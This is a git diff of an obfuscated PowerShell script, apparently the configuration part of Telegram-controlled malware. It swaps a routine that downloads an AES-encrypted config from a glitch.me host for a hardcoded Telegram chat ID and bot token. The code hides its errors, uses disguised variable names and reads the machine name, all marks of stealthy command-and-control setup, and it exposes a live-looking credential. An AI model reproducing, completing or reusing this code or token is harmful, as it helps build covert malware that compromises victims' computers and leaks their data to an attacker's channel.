@@ -1,68 +1,9 @@
-﻿$ErrorActionPreference= 'silentlycontinue'
+$ErrorActionPreference= 'silentlycontinue'
 $ᵃ = $env:COMPUTERNAME
 $ᵇ = Get-Random
 
-# Função para descriptografar AES-256
-function Decrypt-AES {
-    param(
-        [string]$EncryptedString,
-        [string]$Key
-    )
-    try {
-        # Separar IV e texto criptografado
-        $Parts = $EncryptedString.Split(':')
-        if ($Parts.Count -ne 2) {
-            throw "Formato de string criptografada inválido"
-        }
-        
-        $IVBase64 = $Parts[0]
-        $EncryptedBase64 = $Parts[1]
-        
-        # Converter IV e texto criptografado
-        $IV = [System.Convert]::FromBase64String($IVBase64)
-        $EncryptedBytes = [System.Convert]::FromBase64String($EncryptedBase64)
-        
-        # Gerar chave SHA-256
-        $KeyBytes = [System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
-        
-        # Criar AES
-        $AES = [System.Security.Cryptography.Aes]::Create()
-        $AES.Key = $KeyBytes
-        $AES.IV = $IV
-        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
-        $AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-        
-        # Descriptografar
-        $Decryptor = $AES.CreateDecryptor()
-        $DecryptedBytes = $Decryptor.TransformFinalBlock($EncryptedBytes, 0, $EncryptedBytes.Length)
-        
-        return [System.Text.Encoding]::UTF8.GetString($DecryptedBytes)
-    }
-    catch {
-        Write-Error "Erro na descriptografia: $_"
-        return $null
-    }
-}
-
-# Baixar configuração remota
-try {
-    $ConfigUrl = "https://elfin-concrete-allosaurus.glitch.me/config"
-    $EncryptedConfig = (Invoke-WebRequest -Uri $ConfigUrl -UseBasicParsing).Content
-    $ConfigKey = $env:COMPUTERNAME + $env:USERNAME + "BLX" # Chave única por máquina
-    $Config = $EncryptedConfig | ConvertFrom-Json
-    
-    # Descriptografar valores
-    $ᶜ = Decrypt-AES -EncryptedString $Config.chat_id -Key $ConfigKey
-    $ᵈ = Decrypt-AES -EncryptedString $Config.token -Key $ConfigKey
-    
-    if (!$ᶜ -or !$ᵈ) {
-        throw "Falha na descriptografia"
-    }
-}
-catch {
-    Write-Error "Erro ao carregar configuração: $_"
-    exit
-}
+$ᶜ = "-4843398935" 
+$ᵈ = "8011090957:AAFx3ViYWVUvefYiSBprpXcQA9JRyUEncWM" 
 
 $ᵉ = "true" 
 $ᶠ = "true" 
